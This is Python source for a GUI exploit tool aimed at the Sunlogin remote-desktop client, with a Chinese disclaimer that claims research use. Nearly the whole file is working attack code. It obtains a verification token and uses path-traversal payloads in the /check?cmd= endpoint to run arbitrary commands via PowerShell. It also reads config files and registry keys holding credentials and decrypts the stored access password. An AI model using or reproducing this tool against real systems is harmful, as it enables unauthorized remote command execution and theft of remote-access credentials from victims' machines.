from tkinter import *
from tkinter import messagebox
from tkinter import ttk
import json
import re
import time
import requests
from SunDecrypt import *
session = requests.session()

class sunlogin_gui():

    def __init__(self, root):
        self.root = root

    def gui(self):
        self.root.geometry("600x466+458+264")
        self.root.title("Sunlogin_RCE漏洞利用工具2.0  by ьαι")
        
        self.label_url = Label(self.root, text="目标地址", width=9)
        self.label_url.grid(row=0, column=0)
        self.label_cmd = Label(self.root, text="输入命令", width=9)
        self.label_cmd.grid(row=1, column=0)

        self.url_entry = Entry(self.root, width=30)
        self.url_entry.grid(row=0, column=1)
        self.url_entry.delete(0, "end")
        self.url_entry.insert(0, "127.0.0.1:49087")
        self.entry_cmd = Entry(self.root, width=30)
        self.entry_cmd.grid(row=1, column=1)
        self.output = Text(self.root, height=18)
        self.output.grid(row=2, column=0, columnspan=4)
        self.output.insert("insert", "⚠️ 免责声明\n\n")
        self.output.insert("end", "     此工具仅作为网络安全攻防研究交流，请使用者遵照网络安全法合理使用！ 如果使用者使用该工具出现非法攻击等违法行为，与本作者无关！")
        self.Decrypt_output = Text(self.root, height=10)
        self.Decrypt_output.grid(row=4, column=0, columnspan=4)

        self.getconfig_cbox = ttk.Combobox(self.root, width=11)
        self.getconfig_cbox.grid(row=0, column=2)
        self.getconfig_cbox['value'] = ('getconfig_1', 'getconfig_2', 'getconfig_3', 'getconfig_4', 'getconfig_5', 'getconfig_6', 'getconfig_7', 'getconfig_8')
        self.getconfig_cbox.current(0)

        self.cmd_cbox = ttk.Combobox(self.root, width=11)
        self.cmd_cbox.grid(row=1, column=2)
        self.cmd_cbox['value'] = ('cmd_1', 'cmd_2', 'cmd_3')
        self.cmd_cbox.current(0)

        self.button_getconfig = Button(self.root, text="获取配置信息", width=11, command = self.get_config)
        self.button_getconfig.grid(row=0, column=3)
        self.button_cmd = Button(self.root, text="执行", width=11, command = self.RCE)
        self.button_cmd.grid(row=1, column=3)
        self.button_Decrypt = Button(self.root, text="提取登录信息并解密", width=15, command=self.Decrypt)
        self.button_Decrypt.grid(row=3, column=0, columnspan=4)
    
    def get_config(self):
        url = "http://" + self.url_entry.get()
        payload = self.getconfig_cbox.get()
        cookies_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Cache-Control": "max-age=0"}
        getconfig_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Cache-Control": "max-age=0"}
        cookies_url = url + "/cgi-bin/rpc?action=verify-haras"
        cmd = self.entry_cmd.get()
        if payload == 'getconfig_1':
            payload = "/check?cmd=ping../../../../../../../../../../../windows/system32/windowspowershell/v1.0/powershell.exe+type+C:\Progra~1\Oray\SunLogin\SunloginClient\config.ini"
        elif payload == 'getconfig_2':
            payload = "/check?cmd=ping../../../../../../../../../../../windows/system32/windowspowershell/v1.0/powershell.exe+type+C:\Progra~2\Oray\SunLogin\SunloginClient\config.ini"
        elif payload == 'getconfig_3':
            payload = "/check?cmd=ping../../../../../../../../../../../windows/system32/windowspowershell/v1.0/powershell.exe+type+C:\ProgramData\Oray\SunloginClient\config.ini"
        elif payload == 'getconfig_4':
            payload = "/check?cmd=ping../../../../../../../../../../../windows/system32/reg+query+HKEY_USERS\.DEFAULT\Software\Oray\SunLogin\SunloginClient\SunloginInfo"
        elif payload == 'getconfig_5':
            payload =  "/check?cmd=ping../../../../../../../../../../../windows/system32/reg+query+HKEY_USERS\.DEFAULT\Software\Oray\SunLogin\SunloginClient\SunloginGreenInfo"
        elif payload == 'getconfig_6':
            payload = '/check?cmd=ping/../findstr%20.%20"C:\Progra~1\Oray\SunLogin\SunloginClient\config.ini"'
        elif payload == 'getconfig_7':
            payload = '/check?cmd=ping/../findstr%20.%20"C:\Progra~2\Oray\SunLogin\SunloginClient\config.ini"'
        elif payload == 'getconfig_8':
            payload =  '/check?cmd=ping/../findstr%20.%20"C:\ProgramData\Oray\SunloginClient\config.ini"'
        getconfig_url = url + payload
        if url:
            try:
                res = json.loads(session.get(cookies_url, headers=cookies_headers, timeout=5).text)
                token = res.get('verify_string')
                getconfig_cookies = {"CID": token}
                res = session.get(getconfig_url, headers=getconfig_headers, cookies=getconfig_cookies)
                res.encoding = 'utf-8'
                self.output.delete(1.0, END)
                self.output.insert(1.0, res.text)
            except:
                self.output.delete(1.0,END)
                self.output.insert(1.0,"获取配置文件失败")

    def RCE(self):
        url = "http://" + self.url_entry.get()
        payload = self.cmd_cbox.get()
        cookies_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Cache-Control": "max-age=0"}
        cmd_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Cache-Control": "max-age=0"}
        cookies_url = url + "/cgi-bin/rpc?action=verify-haras"
        cmd = self.entry_cmd.get()
        if payload == 'cmd_1':
            payload = "/check?cmd=ping../../../../../../../../../../../windows/system32/"
        elif payload == 'cmd_2':
            payload = "/check?cmd=ping../../../../../../../../../../../windows/SysWOW64/"
        elif payload == 'cmd_3':
            payload = "/check?cmd=ping../../../../../../../../../../../windows/system32/windowspowershell/v1.0/powershell.exe "
        cmd_url = url + payload + cmd
        if url:
            try:
                res = json.loads(session.get(cookies_url, headers=cookies_headers, timeout=5).text)
                token = res.get('verify_string')
                cmd_cookies = {"CID": token}
                res = session.get(cmd_url, headers=cmd_headers, cookies=cmd_cookies)
                res.encoding = 'utf-8'
                if '�' in res.text:
                    res.encoding = 'gbk'
                self.output.delete(1.0, END)
                self.output.insert(1.0, res.text)
            except Exception as e:
                self.output.delete(1.0,END)
                self.output.insert(1.0,"执行命令失败")
                print(e)
    
    def Decrypt(self):
        sun_config = self.output.get(1.0,END)
        try:
            if 'encry_pwd' in sun_config:
                fastcode = str(re.findall(r"fastcode=([\s\S]*?)\r",sun_config))[2:-2:]
                fastcode2 = fastcode[1:-2:]
                encry_pwd =  str(re.findall(r"encry_pwd=([\s\S]*?)\r",sun_config))[2:-2:]
                sunlogincode =  str(re.findall(r"sunlogincode=([\s\S]*?)\r",sun_config))[2:-2:]
                pwd = Decrypt(base64.b64decode(encry_pwd),
                            Init(KeyBlock.new_block(sunlogincode)).start()).start().decode()
                if len(sunlogincode) != 0:
                    sunlogincod = sunlogincode + ' ===> 有人正在登录使用'
                else:
                    sunlogincod = 'None ===> 目前无人登录'

                self.Decrypt_output.delete(1.0, END)
                self.Decrypt_output.insert(1.0, '\n\n\n' + 'sunlogincode = ' + sunlogincod + '\n' + '伙伴识别码 = ' + fastcode + ' ===> ' + fastcode2 + '\n' + '验证码 = ' + encry_pwd + ' ===> ' + pwd)
            else:
                self.Decrypt_output.delete(1.0,END)
                self.Decrypt_output.insert(1.0,"提取失败")

        except Exception as e:
            self.Decrypt_output.delete(1.0,END)
            self.Decrypt_output.insert(1.0,"提取失败")
            print(e)

def gui_start():
    root = Tk()
    ZMJ_PORTAL =  sunlogin_gui(root)
    ZMJ_PORTAL.gui()
    root.mainloop()

gui_start()
